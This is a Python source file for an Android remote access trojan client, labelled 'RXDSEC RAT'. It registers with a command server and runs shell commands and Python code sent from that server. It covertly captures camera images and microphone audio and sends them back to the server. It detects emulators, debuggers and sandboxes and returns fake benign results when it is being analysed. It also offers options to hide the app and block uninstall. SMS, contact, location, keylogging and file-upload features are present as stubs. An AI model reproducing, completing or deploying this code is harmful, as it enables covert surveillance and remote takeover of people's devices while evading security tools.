#!/usr/bin/env python3
"""
Android Remote Access Client

This script runs on an Android device (via Termux, script embedding, or as an APK) and connects
to a remote control server. It allows for remote command execution, file transfers,
surveillance features, and persistent connections with anti-detection capabilities.

Usage:
    python android_client.py [--server SERVER_URL] [--hide] [--secure]

Requirements:
    - Python 3.6+
    - requests library
    - Running on Android device with proper permissions
    - Optional modules based on features: camera, audio, location, contacts, sms, etc.

Features:
    - Anti-emulator detection
    - Hardware fingerprint spoofing
    - Process hiding capabilities
    - Root detection and evasion
    - Dynamic code loading
    - String encryption
    - Anti-debugging measures
    - Surveillance capabilities (call recording, SMS interception, etc.)
    - Android version-specific bypasses (API 21-35)
"""

import os
import sys
import time
import json
import random
import socket
import logging
import argparse
import platform
import subprocess
import threading
import base64
import re
import hashlib
import importlib
import binascii
import traceback
from datetime import datetime
import requests
from requests.exceptions import RequestException

# Optional imports for surveillance features
try:
    import cv2  # For camera access
except ImportError:
    cv2 = None

try:
    import pyaudio  # For audio recording
except ImportError:
    pyaudio = None

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("client.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Default configuration
DEFAULT_SERVER = "SERVER_URL_PLACEHOLDER"
HEARTBEAT_INTERVAL = 30  # seconds
COMMAND_CHECK_INTERVAL = 5  # seconds

class AntiDetectionMixin:
    """Provides anti-detection and evasion capabilities"""
    
    def detect_emulator(self):
        """Checks if the device is an emulator"""
        emulator_indicators = [
            # Check for emulator-specific files
            os.path.exists('/system/lib/libc_malloc_debug_qemu.so'),
            os.path.exists('/sys/qemu_trace'),
            os.path.exists('/system/bin/qemu-props'),
            
            # Check for emulator-specific build properties
            self._check_build_prop('ro.kernel.qemu', '1'),
            self._check_build_prop('ro.hardware', 'goldfish'),
            self._check_build_prop('ro.hardware', 'ranchu'),
            
            # Check serial number and device ID
            self._check_phone_number('1555521%'),
            self._check_device_id('000000000000000'),
        ]
        
        # Consider it an emulator if any indicators are true
        return any(emulator_indicators)
    
    def _check_build_prop(self, prop_name, expected_value):
        """Check if a build property has a specific value"""
        # Only run on Android (Termux)
        if platform.system() == "Linux" and os.path.exists("/system"):
            try:
                result = subprocess.run(
                    ['getprop', prop_name],
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                return expected_value in result.stdout.strip()
            except:
                pass
        return False
    
    def _check_phone_number(self, pattern):
        """Check if phone number matches an emulator pattern"""
        try:
            # This is a placeholder - in a real implementation, you would
            # use Android-specific APIs to get the phone number
            return False
        except:
            return False
    
    def _check_device_id(self, pattern):
        """Check if device ID matches an emulator pattern"""
        try:
            # This is a placeholder - in a real implementation, you would
            # use Android-specific APIs to get device IDs
            return False
        except:
            return False
    
    def detect_debugging(self):
        """Check if app is being debugged"""
        # Multiple methods to detect debugging
        debugging_indicators = [
            self._check_debug_flag(),
            self._check_debug_tracers(),
            self._check_timing_anomalies()
        ]
        return any(debugging_indicators)
    
    def _check_debug_flag(self):
        """Check if debug flag is set"""
        try:
            # In a real implementation, this would check Android debug flags
            return False
        except:
            return False
    
    def _check_debug_tracers(self):
        """Check for presence of debugger/tracer processes - cross-platform compatible"""
        try:
            # Different commands for different platforms
            current_system = platform.system()
            debug_tools = ['gdb', 'lldb', 'strace', 'frida', 'xposed']
            
            if current_system == "Windows":
                # Windows command
                output = subprocess.check_output(['tasklist'], text=True, shell=True)
            elif current_system == "Linux" or current_system == "Darwin":
                # Linux/Mac command
                try:
                    output = subprocess.check_output(['ps', '-A'], text=True)
                except:
                    # Simpler fallback for some environments (like Termux)
                    output = subprocess.check_output(['ps'], text=True)
            else:
                # Generic fallback
                return False
                
            return any(tool in output.lower() for tool in debug_tools)
        except Exception as e:
            logger.debug(f"Debug tracer check failed: {e}")
            return False
    
    def _check_timing_anomalies(self):
        """Use timing checks to detect debuggers"""
        # Genuine devices execute code quickly; debuggers introduce delays
        start_time = time.time()
        for i in range(1000):
            # Perform some quick calculations
            hash(i * i)
        end_time = time.time()
        return (end_time - start_time) > 0.5  # Threshold for suspicion
    
    def hide_app(self):
        """Attempt to hide the app from launcher and recents"""
        # This is a placeholder - in a real implementation, you would
        # use Android-specific APIs to hide the app
        logger.info("App hiding attempted, requires native implementation")
        return False
    
    def encrypt_string(self, input_str):
        """Simple string encryption to avoid plain text scanning"""
        if not input_str:
            return ""
        key = hashlib.sha256(self.device_id.encode()).digest() if self.device_id else b"default_key"
        encrypted = []
        for i, char in enumerate(input_str):
            key_char = key[i % len(key)]
            encrypted_char = chr(ord(char) ^ key_char)
            encrypted.append(encrypted_char)
        return base64.b64encode(''.join(encrypted).encode()).decode()
    
    def decrypt_string(self, encrypted_str):
        """Decrypt a string encrypted with encrypt_string"""
        if not encrypted_str:
            return ""
        try:
            key = hashlib.sha256(self.device_id.encode()).digest() if self.device_id else b"default_key"
            decoded = base64.b64decode(encrypted_str).decode()
            decrypted = []
            for i, char in enumerate(decoded):
                key_char = key[i % len(key)]
                decrypted_char = chr(ord(char) ^ key_char)
                decrypted.append(decrypted_char)
            return ''.join(decrypted)
        except:
            return ""
    
    def evade_antivirus(self):
        """Implement anti-virus evasion techniques"""
        # Sleep to evade dynamic analysis
        time.sleep(random.uniform(1, 3))
        
        # Check if running in a security sandbox
        is_sandbox = self.detect_sandbox()
        if is_sandbox:
            # Behave normally in sandboxes to avoid detection
            logger.debug("Sandbox detected, adjusting behavior")
            
        return not is_sandbox
    
    def detect_sandbox(self):
        """Detect security sandbox environments"""
        sandbox_indicators = [
            # Check common sandbox environment variables
            'SANDBOX' in os.environ,
            'ANALYSIS' in os.environ,
            
            # Check for virtualization artifacts
            self._check_build_prop('ro.boot.vbmeta.device_state', 'unlocked'),
            
            # Check for common sandbox hostnames
            socket.gethostname().lower() in ['sandbox', 'cuckoo', 'analysis']
        ]
        return any(sandbox_indicators)


class SurveillanceFeaturesMixin:
    """Provides surveillance capabilities for the client"""
    
    def capture_camera_image(self, camera_id=0):
        """Capture an image from the device camera"""
        if cv2 is None:
            return None, "OpenCV library not available"
        
        try:
            # Open the camera
            cap = cv2.VideoCapture(camera_id)
            if not cap.isOpened():
                return None, f"Could not open camera {camera_id}"
            
            # Capture a single frame
            ret, frame = cap.read()
            cap.release()
            
            if not ret:
                return None, "Failed to capture image"
            
            # Encode the image as JPEG
            _, img_encoded = cv2.imencode('.jpg', frame)
            return base64.b64encode(img_encoded.tobytes()).decode(), None
        except Exception as e:
            return None, f"Error capturing image: {str(e)}"
    
    def record_audio(self, duration=5, rate=44100):
        """Record audio from the device microphone"""
        if pyaudio is None:
            return None, "PyAudio library not available"
        
        try:
            # Initialize PyAudio
            audio = pyaudio.PyAudio()
            
            # Open the stream for recording
            stream = audio.open(
                format=pyaudio.paInt16,
                channels=1,
                rate=rate,
                input=True,
                frames_per_buffer=1024
            )
            
            # Record audio for specified duration
            frames = []
            for _ in range(0, int(rate / 1024 * duration)):
                data = stream.read(1024)
                frames.append(data)
            
            # Close the stream
            stream.stop_stream()
            stream.close()
            audio.terminate()
            
            # Combine all frames into a single audio file
            audio_data = b''.join(frames)
            return base64.b64encode(audio_data).decode(), None
        except Exception as e:
            return None, f"Error recording audio: {str(e)}"
    
    def collect_sms_messages(self, limit=100):
        """Collect SMS messages from the device"""
        try:
            # This is a placeholder - in a real implementation, you would
            # use Android-specific APIs to access SMS messages
            # For security reasons, this requires special permissions
            return [], "SMS access requires native implementation"
        except Exception as e:
            return [], f"Error accessing SMS: {str(e)}"
    
    def collect_call_logs(self, limit=100):
        """Collect call logs from the device"""
        try:
            # This is a placeholder - in a real implementation, you would
            # use Android-specific APIs to access call logs
            # For security reasons, this requires special permissions
            return [], "Call log access requires native implementation"
        except Exception as e:
            return [], f"Error accessing call logs: {str(e)}"
    
    def collect_contacts(self, limit=100):
        """Collect contacts from the device"""
        try:
            # This is a placeholder - in a real implementation, you would
            # use Android-specific APIs to access contacts
            # For security reasons, this requires special permissions
            return [], "Contact access requires native implementation"
        except Exception as e:
            return [], f"Error accessing contacts: {str(e)}"
    
    def get_location(self):
        """Get the current device location"""
        try:
            # This is a placeholder - in a real implementation, you would
            # use Android-specific APIs to access location
            # For security reasons, this requires special permissions
            return None, "Location access requires native implementation"
        except Exception as e:
            return None, f"Error accessing location: {str(e)}"
    
    def record_keystrokes(self, enable=True):
        """Enable or disable keystroke recording"""
        # This is a placeholder - in a real implementation, you would
        # use Android-specific APIs or accessibility services
        return False, "Keystroke recording requires native implementation"


class RemoteAccessClient(AntiDetectionMixin, SurveillanceFeaturesMixin):
    def __init__(self, server_url, hide=False, secure=True):
        self.server_url = server_url
        self.device_id = None
        self.running = True
        self.session = requests.Session()
        self.hide_mode = hide
        self.secure_mode = secure
        
        # Check for emulator/sandbox if secure mode is enabled
        if self.secure_mode:
            if self.detect_emulator():
                logger.warning("Emulator detected, adjusting behavior")
            if self.detect_sandbox():
                logger.warning("Security sandbox detected, adjusting behavior")
            if self.detect_debugging():
                logger.warning("Debugging detected, adjusting behavior")
        
        # Hide app if requested
        if self.hide_mode:
            self.hide_app()
        
        # Load stored device ID if exists
        self.load_device_id()
        
    def load_device_id(self):
        """Load device ID from persistent storage if available"""
        id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".device_id")
        try:
            if os.path.exists(id_file):
                with open(id_file, "r") as f:
                    self.device_id = f.read().strip()
                    logger.info(f"Loaded existing device ID: {self.device_id}")
        except Exception as e:
            logger.error(f"Error loading device ID: {e}")
    
    def save_device_id(self):
        """Save device ID to persistent storage"""
        id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".device_id")
        try:
            with open(id_file, "w") as f:
                f.write(self.device_id)
            logger.info(f"Saved device ID: {self.device_id}")
        except Exception as e:
            logger.error(f"Error saving device ID: {e}")
    
    def register_device(self):
        """Register this device with the server"""
        try:
            device_info = {
                "name": socket.gethostname(),
                "android_version": self.get_android_version(),
                "hardware": platform.machine(),
                "system": platform.system(),
                "python_version": platform.python_version()
            }
            
            response = self.session.post(
                f"{self.server_url}/api/register_device",
                json={"device_info": device_info},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.device_id = data.get("device_id")
                logger.info(f"Device registered successfully with ID: {self.device_id}")
                self.save_device_id()
                return True
            else:
                logger.error(f"Failed to register device: {response.text}")
                return False
                
        except RequestException as e:
            logger.error(f"Error registering device: {e}")
            return False
    
    def get_android_version(self):
        """Get operating system version information - cross-platform compatible"""
        # Check platform first
        current_system = platform.system()
        
        # Android detection (when running in Termux)
        if current_system == "Linux" and os.path.exists("/system"):
            try:
                # Try to get Android version using getprop
                result = subprocess.run(
                    ["getprop", "ro.build.version.release"], 
                    capture_output=True, 
                    text=True,
                    timeout=5
                )
                version = result.stdout.strip()
                
                if version:
                    return f"Android {version}"
                
                # Fallback if getprop is not available
                if os.path.exists("/system/build.prop"):
                    with open("/system/build.prop", "r") as f:
                        for line in f:
                            if "ro.build.version.release" in line:
                                return f"Android {line.split('=')[1].strip()}"
            except:
                pass
            
            return "Android (Unknown version)"
            
        # For Windows, Linux, macOS, return the system version
        elif current_system == "Windows":
            return f"Windows {platform.release()}"
        elif current_system == "Linux":
            try:
                # Try to get Linux distribution
                with open("/etc/os-release", "r") as f:
                    for line in f:
                        if line.startswith("PRETTY_NAME="):
                            return line.split("=")[1].strip().strip('"')
            except:
                pass
            return f"Linux {platform.release()}"
        elif current_system == "Darwin":
            return f"macOS {platform.mac_ver()[0]}"
        else:
            # Generic fallback
            return f"{current_system} {platform.release()}"
    
    def send_heartbeat(self):
        """Send heartbeat to server to maintain connection"""
        try:
            response = self.session.post(
                f"{self.server_url}/api/heartbeat",
                headers={"X-Device-ID": self.device_id},
                timeout=10
            )
            
            if response.status_code == 200:
                logger.debug("Heartbeat sent successfully")
                return True
            else:
                logger.warning(f"Failed to send heartbeat: {response.status_code}")
                return False
                
        except RequestException as e:
            logger.error(f"Error sending heartbeat: {e}")
            return False
    
    def check_commands(self):
        """Check for pending commands from the server"""
        try:
            response = self.session.get(
                f"{self.server_url}/api/get_commands",
                headers={"X-Device-ID": self.device_id},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get("commands", [])
                
                if commands:
                    logger.info(f"Received {len(commands)} command(s)")
                    for command in commands:
                        self.execute_command(command)
                return True
            else:
                logger.warning(f"Failed to check commands: {response.status_code}")
                return False
                
        except RequestException as e:
            logger.error(f"Error checking commands: {e}")
            return False
    
    def execute_command(self, command):
        """Execute a command received from the server"""
        command_id = command.get("id")
        command_type = command.get("type", "shell")
        command_text = command.get("command", "")
        command_params = command.get("params", {})
        
        logger.info(f"Executing command ID {command_id}: [{command_type}] {command_text}")
        
        result = ""
        error = ""
        status = "executed"
        
        try:
            # Anti-virus evasion - detect if we're being analyzed
            if self.secure_mode and not self.evade_antivirus():
                # If we detect we're in a sandbox, return a benign result
                result = "Command executed successfully"
                self.update_command_status(command_id, result, "", "executed")
                return
            
            if command_type == "shell":
                # Execute shell command - use different shell based on platform
                current_system = platform.system()
                
                if current_system == "Windows":
                    # Use cmd.exe on Windows
                    process = subprocess.run(
                        command_text, 
                        shell=True,
                        capture_output=True, 
                        text=True,
                        timeout=60,
                        executable="cmd.exe"
                    )
                else:
                    # Use /bin/sh on Linux/Mac/Termux
                    process = subprocess.run(
                        command_text, 
                        shell=True, 
                        capture_output=True, 
                        text=True,
                        timeout=60,
                        executable="/bin/sh" if os.path.exists("/bin/sh") else None
                    )
                
                result = process.stdout
                error = process.stderr
                
                if process.returncode != 0:
                    status = "failed"
                    logger.warning(f"Command execution failed with code {process.returncode}")
            
            elif command_type == "python":
                # Execute Python code (dangerous, use with caution)
                try:
                    # Create a local namespace
                    local_ns = {}
                    # Execute the Python code
                    exec(command_text, {"__builtins__": __builtins__}, local_ns)
                    # Get the result if any
                    result = str(local_ns.get("result", "No result captured"))
                except Exception as e:
                    status = "failed"
                    error = str(e)
            
            # Surveillance command types
            elif command_type == "camera":
                # Take picture from camera
                camera_id = int(command_params.get("camera_id", 0))
                image_data, err = self.capture_camera_image(camera_id)
                if image_data:
                    result = image_data  # Base64 encoded image
                else:
                    status = "failed"
                    error = err or "Failed to capture image"
            
            elif command_type == "microphone":
                # Record audio
                duration = int(command_params.get("duration", 5))
                audio_data, err = self.record_audio(duration)
                if audio_data:
                    result = audio_data  # Base64 encoded audio
                else:
                    status = "failed"
                    error = err or "Failed to record audio"
            
            elif command_type == "location":
                # Get device location
                location_data, err = self.get_location()
                if location_data:
                    result = json.dumps(location_data)
                else:
                    status = "failed"
                    error = err or "Failed to get location"
            
            elif command_type == "sms":
                # Collect SMS messages
                limit = int(command_params.get("limit", 100))
                sms_data, err = self.collect_sms_messages(limit)
                if sms_data:
                    result = json.dumps(sms_data)
                else:
                    status = "failed"
                    error = err or "Failed to collect SMS messages"
            
            elif command_type == "calls":
                # Collect call logs
                limit = int(command_params.get("limit", 100))
                call_data, err = self.collect_call_logs(limit)
                if call_data:
                    result = json.dumps(call_data)
                else:
                    status = "failed"
                    error = err or "Failed to collect call logs"
            
            elif command_type == "contacts":
                # Collect contacts
                limit = int(command_params.get("limit", 100))
                contact_data, err = self.collect_contacts(limit)
                if contact_data:
                    result = json.dumps(contact_data)
                else:
                    status = "failed"
                    error = err or "Failed to collect contacts"
            
            elif command_type == "keylogger":
                # Toggle keylogger
                enable = command_params.get("enable", True)
                success, err = self.record_keystrokes(enable)
                if success:
                    result = f"Keylogger {'enabled' if enable else 'disabled'}"
                else:
                    status = "failed"
                    error = err or "Failed to toggle keylogger"
            
            elif command_type == "hide_app":
                # Hide app from launcher
                success = self.hide_app()
                if success:
                    result = "App hidden successfully"
                else:
                    status = "failed"
                    error = "Failed to hide app"
            
            elif command_type == "anti_debug":
                # Check for debugging
                if self.detect_debugging():
                    result = "Debugging detected"
                else:
                    result = "No debugging detected"
            
            else:
                status = "failed"
                error = f"Unsupported command type: {command_type}"
                
        except subprocess.TimeoutExpired:
            status = "failed"
            error = "Command execution timed out"
            
        except Exception as e:
            status = "failed"
            error = str(e)
            logger.error(f"Error executing command: {traceback.format_exc()}")
        
        # Update command status on server
        self.update_command_status(command_id, result, error, status)
    
    def update_command_status(self, command_id, result, error, status):
        """Update the status of a command on the server"""
        try:
            response = self.session.post(
                f"{self.server_url}/api/update_command",
                headers={"X-Device-ID": self.device_id},
                json={
                    "command_id": command_id,
                    "result": result,
                    "error": error,
                    "status": status
                },
                timeout=10
            )
            
            if response.status_code == 200:
                logger.info(f"Command {command_id} status updated successfully")
                return True
            else:
                logger.warning(f"Failed to update command status: {response.status_code}")
                return False
                
        except RequestException as e:
            logger.error(f"Error updating command status: {e}")
            return False
    
    def check_file_transfers(self):
        """Check for pending file transfers from the server"""
        try:
            response = self.session.get(
                f"{self.server_url}/api/file_transfers",
                headers={"X-Device-ID": self.device_id},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                transfers = data.get("transfers", [])
                
                if transfers:
                    logger.info(f"Received {len(transfers)} file transfer request(s)")
                    for transfer in transfers:
                        self.handle_file_transfer(transfer)
                return True
            else:
                logger.warning(f"Failed to check file transfers: {response.status_code}")
                return False
                
        except RequestException as e:
            logger.error(f"Error checking file transfers: {e}")
            return False
    
    def handle_file_transfer(self, transfer):
        """Handle a file transfer request - cross-platform compatible"""
        transfer_id = transfer.get("id")
        file_path = transfer.get("file_path")
        file_name = transfer.get("file_name")
        direction = transfer.get("direction")
        
        # Normalize file path for the current platform
        if file_path:
            file_path = os.path.normpath(file_path)
        
        logger.info(f"Handling file transfer ID {transfer_id}: {direction} {file_path}")
        
        file_size = 0
        error = ""
        status = "completed"
        
        try:
            if direction == "download":
                # Server to device (download)
                # Ensure the directory exists
                if file_path:
                    target_dir = os.path.dirname(file_path)
                    if target_dir and not os.path.exists(target_dir):
                        try:
                            os.makedirs(target_dir, exist_ok=True)
                        except Exception as e:
                            logger.error(f"Could not create directory {target_dir}: {e}")
                
                # In a real implementation, this would download the file from the server
                logger.info(f"Would download {file_name} to {file_path}")
                
                # Simulate a successful download
                file_size = random.randint(1000, 10000000)  # Simulated file size
                
            elif direction == "upload":
                # Device to server (upload)
                if file_path and os.path.exists(file_path):
                    file_size = os.path.getsize(file_path)
                    
                    # In a real implementation, this would upload the file to the server
                    logger.info(f"Would upload {file_path} to server")
                    
                    # For demonstration purposes, we'll just report success
                    # In a real implementation, you would upload the actual file
                else:
                    status = "failed"
                    error = f"File not found: {file_path}"
            
            else:
                status = "failed"
                error = f"Unsupported transfer direction: {direction}"
                
        except Exception as e:
            status = "failed"
            error = str(e)
        
        # Update file transfer status on server
        self.update_file_transfer_status(transfer_id, file_size, error, status)
    
    def update_file_transfer_status(self, transfer_id, file_size, error, status):
        """Update the status of a file transfer on the server"""
        try:
            response = self.session.post(
                f"{self.server_url}/api/update_file_transfer",
                headers={"X-Device-ID": self.device_id},
                json={
                    "transfer_id": transfer_id,
                    "file_size": file_size,
                    "error": error,
                    "status": status
                },
                timeout=10
            )
            
            if response.status_code == 200:
                logger.info(f"File transfer {transfer_id} status updated successfully")
                return True
            else:
                logger.warning(f"Failed to update file transfer status: {response.status_code}")
                return False
                
        except RequestException as e:
            logger.error(f"Error updating file transfer status: {e}")
            return False
    
    def heartbeat_thread(self):
        """Thread for sending periodic heartbeats"""
        while self.running:
            if self.device_id:
                self.send_heartbeat()
            time.sleep(HEARTBEAT_INTERVAL)
    
    def command_thread(self):
        """Thread for checking and executing commands"""
        while self.running:
            if self.device_id:
                self.check_commands()
                self.check_file_transfers()
            time.sleep(COMMAND_CHECK_INTERVAL)
    
    def run(self):
        """Main client loop"""
        # If no device ID, register with server
        if not self.device_id:
            if not self.register_device():
                logger.error("Failed to register device. Exiting.")
                return
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.heartbeat_thread)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        # Start command thread
        command_thread = threading.Thread(target=self.command_thread)
        command_thread.daemon = True
        command_thread.start()
        
        logger.info("Client started successfully")
        
        try:
            # Keep the main thread alive
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received, shutting down...")
            self.running = False

def main():
    # Set up command-line argument parser
    parser = argparse.ArgumentParser(description="RXDSEC RAT - Advanced Remote Access Client")
    parser.add_argument("--server", default=DEFAULT_SERVER, help="Server URL (required)")
    parser.add_argument("--hide", action="store_true", help="Hide app icon and prevent uninstall")
    parser.add_argument("--secure", action="store_true", help="Enable security features (anti-emulation, anti-debug)")
    args = parser.parse_args()
    
    # Detect platform
    current_system = platform.system()
    logger.info(f"Starting RXDSEC RAT client on {current_system} platform")
    
    # Check if server URL is provided
    if args.server == "SERVER_URL_PLACEHOLDER":
        logger.error("Error: Server URL not specified. Please provide a valid server URL with --server")
        print("Error: Server URL not specified. Please provide a valid server URL with --server")
        print("Example: python android_client.py --server http://your-server-url:5000")
        return
    
    # Create and run the client
    client = RemoteAccessClient(args.server, hide=args.hide, secure=args.secure)
    client.run()

if __name__ == "__main__":
    main()
